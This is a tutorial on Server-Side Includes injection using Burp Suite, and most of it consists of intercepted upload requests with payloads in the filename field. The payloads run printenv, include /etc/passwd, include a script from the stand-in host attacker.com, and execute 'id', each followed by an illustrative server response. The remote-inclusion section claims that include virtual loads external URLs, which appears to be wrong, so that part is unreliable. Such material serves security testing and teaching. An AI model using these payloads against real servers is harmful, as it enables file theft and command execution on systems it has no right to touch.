# 👀 SSI

### **What is SSI?**

Server-Side Includes (SSI) is a feature available on web servers like Apache, IIS, and others that allows dynamic content to be included in static HTML pages. It enables the inclusion of files, execution of scripts, and interaction with environment variables directly within HTML files. SSI is often used to build **dynamic content** like headers, footers, or other reusable page components.

#### **File Extensions Associated with SSI:**

* `.shtml`
* `.shtm`
* `.stm`

When a web application allows files with these extensions to be processed with SSI, it opens the door to **SSI injection** if not properly sanitized.

***

### **SSI Injection Explained**

SSI injection occurs when an attacker can inject **SSI directives** into a file that is then served by the web server. If the web server does not properly sanitize user input, an attacker can inject SSI commands that are interpreted by the server, potentially leading to **information disclosure**, **local file inclusion (LFI)**, or even **Remote Code Execution (RCE)**.

***

### **The Structure of SSI Directives**

SSI directives consist of a **name**, **parameter names**, and **values**. Here's the general syntax:

```markup
<!--#name param1="value1" param2="value2" -->
```

Where:

* `name` refers to the SSI directive (e.g., `printenv`, `echo`, `include`).
* `param1`, `param2`, etc., are parameters that modify the behavior of the directive.
* `value1`, `value2`, etc., are the values assigned to those parameters.

### **Using Burp Suite to Identify SSI Injection Vulnerabilities**

To detect **SSI injection vulnerabilities** in web applications, attackers can utilize Burp Suite to intercept and modify requests sent to the server. The goal is to find parameters or inputs that could be exploited to inject **SSI directives**.

#### **1. Intercepting and Modifying Requests**

Imagine we have a web application that allows users to upload profile images, and in the upload form, the **image filename** parameter might be directly incorporated into an HTML template or a dynamic page. This is where **SSI injection** could be leveraged.

**Burp Suite Request Example for File Upload:**

**Request Intercepted in Burp Suite:**

```markup
POST /upload-profile HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5lLiyqMk7wej39ti
Content-Length: 1234

------WebKitFormBoundary5lLiyqMk7wej39ti
Content-Disposition: form-data; name="profile_image"; filename="user-profile.jpg"
Content-Type: image/jpeg

<binary data here>
------WebKitFormBoundary5lLiyqMk7wej39ti--
```

In this case, the `profile_image` parameter might be used on the server side to dynamically generate a page or profile view for the user. The parameter could be passed to an SSI directive, and if **input sanitization** is not properly implemented, an attacker could inject SSI commands into the filename parameter.

**Injecting SSI Payload:**

In Burp Suite, you could modify the `filename` field to contain an SSI injection payload.

**Example SSI Payload:**

```
user-profile.jpg<!--#printenv-->
```

**Modified Request in Burp Suite:**

```markup
POST /upload-profile HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5lLiyqMk7wej39ti
Content-Length: 1234

------WebKitFormBoundary5lLiyqMk7wej39ti
Content-Disposition: form-data; name="profile_image"; filename="user-profile.jpg<!--#printenv-->"
Content-Type: image/jpeg

<binary data here>
------WebKitFormBoundary5lLiyqMk7wej39ti--
```

#### **2. Analyzing the Response**

After sending the modified request, the server might include the environment variables in its response if the injection was successful.

**Response:**

```html
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Content-Length: 567

<html>
<head><title>Profile - User</title></head>
<body>
  <h1>User Profile</h1>
  <div class="profile-image">
    <img src="/uploads/user-profile.jpg" alt="Profile Image">
  </div>
  <pre>
    SERVER_SOFTWARE=Apache/2.4.41 (Unix)
    DOCUMENT_ROOT=/var/www/html
    PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
    USER=www-data
    ...
  </pre>
</body>
</html>
```

As shown, the attacker can potentially view **environment variables** by injecting the `<!--#printenv-->` directive. This could give valuable information like server paths, usernames, or other internal configuration details that could aid in further attacks, such as **LFI** or **RCE**.

***

### **Advanced Exploits Using Burp Suite**

#### **3. Injecting Local File Inclusion (LFI) Payload**

The **include** directive can be exploited for **local file inclusion (LFI)**, allowing attackers to read sensitive files such as `/etc/passwd`, which contains user details, or `/var/log/apache2/access.log`, which might reveal server activity.

**Burp Suite Example for LFI Payload:**

Imagine the vulnerable application uses the `image_filename` parameter to load a user’s profile picture, but it’s also dynamically incorporated into an SSI template.

**Burp Suite Request with LFI Injection:**

```markup
POST /profile-image HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5lLiyqMk7wej39ti
Content-Length: 1234

------WebKitFormBoundary5lLiyqMk7wej39ti
Content-Disposition: form-data; name="image_filename"; filename="profile.jpg<!--#include file='/etc/passwd'-->"
Content-Type: image/jpeg

<binary data here>
------WebKitFormBoundary5lLiyqMk7wej39ti--
```

By injecting the payload `<!--#include file='/etc/passwd'-->` into the filename, the attacker could make the server include the contents of `/etc/passwd` when processing the request.

**Expected Response:**

```html
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Content-Length: 567

<html>
<head><title>Profile - User</title></head>
<body>
  <h1>User Profile</h1>
  <div class="profile-image">
    <img src="/uploads/profile.jpg" alt="Profile Image">
  </div>
  <pre>
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/bin/bash
    ...
  </pre>
</body>
</html>
```

This output would expose sensitive **system information** from `/etc/passwd`, such as usernames, UIDs, and the shell used by each user. This is a critical **information disclosure** vulnerability.

***

#### **4. Exploiting Remote File Inclusion (RFI) with External Hosts**

If the server allows including remote files via the `include` directive, an attacker can leverage this for **Remote File Inclusion (RFI)**. By injecting an external URL, attackers can load a malicious script hosted on an external server.

**Burp Suite Request for RFI:**

Assume the application allows including images from URLs but doesn’t sanitize the input properly.

**Burp Suite Request with RFI Payload:**

```markup
POST /profile-image HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5lLiyqMk7wej39ti
Content-Length: 1234

------WebKitFormBoundary5lLiyqMk7wej39ti
Content-Disposition: form-data; name="image_filename"; filename="profile.jpg<!--#include virtual='http://attacker.com/malicious_script.php'-->"
Content-Type: image/jpeg

<binary data here>
------WebKitFormBoundary5lLiyqMk7wej39ti--
```

Here, the attacker injects a remote URL (`http://attacker.com/malicious_script.php`) that will be included when the server processes the `image_filename` parameter.

**Expected Response:**

```html
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Content-Length: 567

<html>
<head><title>Profile - User</title></head>
<body>
  <h1>User Profile</h1>
  <div class="profile-image">
    <img src="/uploads/profile.jpg" alt="Profile Image">
  </div>
  <pre>
    [Malicious Script Executed]
    <script>document.write("This is a malicious payload!")</script>
  </pre>
</body>
</html>
```

If the server supports remote file inclusion, the attacker can execute arbitrary code or malicious scripts from their external server. This could lead to **Remote Code Execution (RCE)**, enabling the attacker to control the vulnerable system.

***

### **Using Burp Suite for Advanced Payloads and Exploits**

#### **5. Advanced Payload for Command Injection**

If the server allows commands to be executed via an SSI directive, the attacker can inject arbitrary commands using **command injection** techniques.

**Burp Suite Request for Command Injection:**

```html
<!--#exec cmd="id" -->
```

In Burp Suite, this can be injected into any parameter that is passed to an SSI directive. For example, a vulnerable file upload form could be tricked into executing arbitrary commands.

**Request in Burp Suite:**

```markup
POST /upload-profile HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5lLiyqMk7wej39ti
Content-Length: 1234

------WebKitFormBoundary5lLiyqMk7wej39ti
Content-Disposition: form-data; name="profile_image"; filename="user-profile.jpg<!--#exec cmd='id'--> "
Content-Type: image/jpeg

<binary data here>
------WebKitFormBoundary5lLiyqMk7wej39ti--
```

**Expected Response:**

```plaintext
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This shows the **user context** under which the server is running, helping the attacker understand if they have sufficient privileges to escalate further.
